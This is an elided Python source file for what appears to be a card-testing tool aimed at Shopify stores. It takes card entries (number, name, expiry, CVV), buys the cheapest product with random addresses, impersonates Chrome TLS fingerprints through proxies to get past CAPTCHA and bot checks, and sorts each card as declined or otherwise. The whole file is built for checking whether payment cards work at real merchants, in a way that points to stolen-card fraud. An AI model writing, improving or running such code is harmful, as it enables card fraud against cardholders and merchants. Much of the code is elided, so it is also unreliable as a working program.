"""
Shopify Checkout Engine — FAST VERSION
=======================================
Anti-CAPTCHA + Performance optimized.

Key Changes (v4 — FAST):
- Browser: chrome120 first (faster than chrome124)
- Retry: 3 → 2 attempts
- Timeout: 20s → 12s
- limit=250 → limit=50 (products.json)
- patch_payload skipped when currency=USD, country=US
- Address fallback loop: 11 → 3 attempts
- Parallel-safe HTTP session reuse
"""
...
# ⭐ FAST: chrome120 first (faster TLS handshake than chrome124)
BROWSER_PROFILES = [
    "chrome120",
    "chrome119",
    "chrome116",
...
# ⭐ FAST: shorter fallback list (US first)
SHIPPING_FALLBACK_ORDER = ["US", "CA", "GB", "AU", "DE"]
...
class TLSClient:
    def __init__(self, timeout=HTTP_TIMEOUT, proxy_url=None, impersonate=None, user_agent=None):
...
def find_cheapest_product(client: TLSClient, shop_url: str,
    ...
    # ⭐ FAST: limit=50 instead of 250
    url = f"{shop_url}/products.json?limit={PRODUCTS_LIMIT}"
    _RETRYABLE = {400, 429, 500, 502, 503, 504}
    resp = None
    last_err: Optional[Exception] = None

    # ⭐ FAST: only 2 attempts
    for attempt in range(1, 3):
        try:
            resp = client.get(url)
        except Exception as exc:
            last_err = exc
            logger.warning("find_cheapest_product attempt %d/2 network error: %s", attempt, exc)
            if attempt < 2:
                time.sleep(1)
            continue
        ...
        raise Exception(f"products.json failed after 2 attempts: {last_err}")
...
def patch_payload(payload: str, currency: str, country: str) -> str:
    # ⭐ FAST: skip when USD/US
    if currency == "USD" and country == "US":
        return payload
    # else simple string replace (no JSON parse)
    if currency != "USD":
...
def send_pci_session(ident_sig: str, card_number: str, card_name: str,
                     ...
                     impersonate: str = "chrome120") -> Tuple[int, str]:
    ...
    with Session(impersonate=impersonate) as session:
        post_kwargs = {"data": payload, "headers": headers, "timeout": PCI_TIMEOUT}
        if proxy_url:
...
def run_checkout_for_card(shop_url: str, card_entry: str, proxy_url: str = "", low: bool = True) -> CheckResult:
    ...
    client = TLSClient(timeout=HTTP_TIMEOUT, proxy_url=proxy_url,
    ...
    try:
        ...
        # Step 6 — ⭐ FAST: only 3 fallback attempts
        try:
            addr = random_address()
            fallback_addrs = get_fallback_addresses(addr.country_code)[:3]
            fallback_idx = 0
            qt2 = queue_token2
            final_p3_body = None
            final_qt3 = None
        ...
        try:
            ...
            for _pi in range(3):  # ⭐ FAST: 3 attempts instead of 6
                if not _pending_re.search(proposal5_body):
                    break
                _m = _poll_re.search(proposal5_body)
                _wait = int(_m.group(1)) / 1000.0 if _m else 0.3
                time.sleep(max(_wait, 0.2))
                proposal5_status, proposal5_body = send_proposal(
                    client, shop_url, checkout_url, checkout_token, session_token,
                    stable_id, variant_id, price, proposal_id, build_id, source_token,
                    currency, country,
        ...
        try:
            ...
            if not pci_session_id:
                _fallback = "https://checkout.pci.shopifyinc.com/sessions"
                _, pci_body = send_pci_session(
                    ident_sig, card_number, card_name_str,
                    card_month, card_year, card_cvv,
        ...
        try:
            ...
            MAX_TAX_RETRIES = 2  # ⭐ FAST: 2 instead of 3
            submit_status = 0
            submit_body = ""
        ...
        for poll_num in range(1, 15):  # ⭐ FAST: 15 instead of 20
            try:
                ...
                if receipt_type == "FailedReceipt":
                    ...
                    if "CAPTCHA" in error_code:
                        ...
                        return result
                    elif error_code in ("CARD_DECLINED", "EXPIRED_CARD", "INVALID_CVC"):
                        result.status = CheckStatus.DECLINED
                        ...
                        if "InventoryReservationFailure" in poll_body:
                            ...
                            return result
                        result.status = CheckStatus.DECLINED
                        result.status_code = mapped or "CARD_DECLINED"
                ...
                if match:
                    try:
                        ...
                        pass
                time.sleep(min(delay, 2000) / 1000.0)  # ⭐ FAST: cap 2s
